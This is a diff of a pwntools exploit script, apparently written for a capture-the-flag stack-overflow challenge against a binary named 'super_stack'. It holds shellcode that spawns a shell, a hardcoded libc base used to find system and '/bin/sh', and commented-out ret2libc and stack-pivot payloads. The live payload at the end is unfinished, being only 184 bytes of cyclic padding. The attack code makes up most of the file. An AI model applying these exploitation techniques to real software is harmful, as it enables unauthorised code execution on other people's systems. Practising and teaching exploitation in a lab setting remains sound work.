@@ -5,15 +5,14 @@ import sys
 binary = "./super_stack"
 elf = context.binary = ELF(binary, False)
 
-context.log_level  = 'debug'
+#context.log_level  = 'debug'
 libc = elf.libc
 rop = ROP(elf)
 
 #### GDB Script
 script = '''
-
-b *main+109
-s
+b *0x8049243
+c
 '''
 
 
@@ -64,25 +63,66 @@ def main():
     ret = 0x0804900e # ret gadget
     ru("buf: ")
     leak = int(rl(), 16)
+    
     log.success(f"BUFFER LEAK : {hex(leak)}")
+    
     shellcode = asm(shellcraft.sh())
     shell_len = len(shellcode)
-    offset =  108 + 8# get correct offset
-    payload = flat(
-        #cyclic(offset),
-        shellcode,
-        cyclic((offset - shell_len)),
-        ret,
-        leak
-    )
 
-    libc.address = 0xf7e14000
-    #insh = next(libc.search("/bin/sh"))
+    #offset =  108 + 4# get correct offset
+    #payload = flat(
+    #    #cyclic(offset),
+    #    b'\x90'*10,
+    #    shellcode,
+    #    cyclic((offset - (shell_len + 10))),
+    #    #ret,
+    #    leak
+    #)
+
+    libc.address = 0xf7d7c000
+    binsh = next(libc.search(b"/bin/sh"))
     system = libc.symbols['system']
 
+
+    # stack pivoting
+    #payload = flat(
+    #    0x0,
+    #    system,
+    #    0x08049022, # pop_ebx
+    #    binsh,
+    #    cyclic((108 - (4*4))),
+    #    leak,
+    #    0x08049145, # leave; ret
+    #)
+
+    #offset = 48
+    #payload = flat(
+    #    cyclic(48),
+    #    system,
+    #    0x08049022, # pop_ebx
+    #    binsh,
+    #)
+
+    payload = flat(
+        cyclic(184),
+        
+    )
+
     s(payload)
-    rl()
+    #rl()
     ia()
+
+
+
+    '''
+    # 184 to esp 
+    stack pointer
+     0xffffcfcc
+    '''
+
+    
+
+
 
 
 if __name__ == "__main__":
